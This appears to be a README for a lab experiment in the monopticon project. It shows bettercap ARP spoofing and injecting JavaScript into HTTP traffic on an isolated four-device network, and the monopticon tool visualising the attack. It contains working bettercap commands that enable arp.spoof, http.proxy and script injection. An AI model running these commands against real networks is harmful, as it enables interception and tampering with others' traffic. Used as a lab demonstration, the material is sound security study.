Introduction
------------

The goal of this expirement is to demonstrate how `bettercap` can inject
javascript into http streams when performing a Man-in-The-Middle and how its
possibile to visually confirm the attack is working with `monopticon`.

The video posted to [Youtube](https://www.youtube.com/watch?v=nixfg6opr_M) describes the expirement well.
The injected javascript that changes the page is available [here](https://github.com/nskelsey/monopticon/master/src/expirements/arp-spoof/script.js).

Expiremental Setup
------------------
Inside of an isolated unmanaged network, an attacker performing an ARP spoofing
attack, man in the middles http requests to a website running on a device in the
local network.

- 1 Netgear Max GS724 24 port switch
- 2 Raspberry Pi 3 running Raspbian-Stretch v4.14
- 1 Lenovo T480 running Monopticon v0.2.0 and Bettercap v2.22
- 3 RJ45 0.5m cables

### Network Design

```
[ pi C ] [ pi B ] [ lenovo ]
   \        |         /
    \       |        /
     \      |       /
      \     |      /
    [ netgear switch ]
```


### Normal ARP Mappings
The addresses are shown below in the diagram if the network was properly configured.

```
10.0.0.1 00:50:b6:b7:2b:eb # Attacker
10.0.0.2 b8:27:eb:71:b2:3e # Bruno
10.0.0.3 b8:27:eb:71:0f:5d # Cocco
```

### Man in the Middle Machine

```zsh
> ip address add dev enp0s31f6 10.0.0.1/24

> sudo su
> /home/synnick/go/bin/bettercap -iface enp0s31f6 -eval 'net.recon on; http.proxy on; arp.spoof on; ticker on;'
```


### Manipulated ARP Tables

ARP Table of Bruno
```
10.0.0.3 00:50:b6:b7:2b:eb # Attacker
```

ARP Table of Cocco
```
10.0.0.2 00:50:b6:b7:2b:eb # Attacker
```


### Attack Results

As shown the once the Lenovo machine starts broadcasting IP addresses

![what it looks like](https://raw.githubusercontent.com/nskelsey/monopticon/master/contrib/screens/local-mitm.gif)

Appendix
--------
## Initial Setup

### Cocco
```zsh
> sudo apt install vim tmux nginx
# changed hostname
# enabled ssh
> enable sshd w/ password
> sudo vim /etc/dhcpdc.conf
# static 10.0.0.3
> wget -r https://soapbox.nskelsey.com --convert-links
> systemctl enable nginx
> cp -fr soapbox.nskelsey.com/* /var/www/html/
> arp -s 10.0.0.2 00:50:b6:b7:2b:eb
```

### Bruno
```zsh
> sudo apt install vim tmux
> enable sshd w/ password
# idem w/o nginx
> arp -s 10.0.0.3 00:50:b6:b7:2b:eb
```

### Attacker

During the attack execute:

```zsh
> cd /home/synnick/projects/monopticon/build
> ping -c5 10.0.0.2 &; ping -c5 10.0.0.3 &; ./bin/monopticon
> /home/synnick/go/bin/bettercap -eval 'net.recon on; set http.proxy.injectjs "/home/synnick/projects/monopticon/src/expirements/arp-spoof/script.js"; http.proxy on; arp.spoof on; ticker on;'
```
